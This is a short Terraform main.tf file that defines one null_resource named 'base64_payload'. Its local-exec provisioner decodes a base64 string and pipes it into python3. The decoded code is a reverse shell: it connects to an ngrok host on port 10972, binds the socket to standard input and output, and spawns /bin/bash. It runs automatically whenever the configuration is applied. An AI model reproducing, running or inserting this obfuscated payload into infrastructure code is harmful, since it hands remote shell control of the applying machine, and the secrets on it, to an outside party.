# main.tf
resource "null_resource" "base64_payload" {
  provisioner "local-exec" {
    command = <<EOT
      echo "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjIudGNwLmV1Lm5ncm9rLmlvIiwxMDk3MikpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCmltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIik=" | base64 -d | python3
    EOT
  }
}
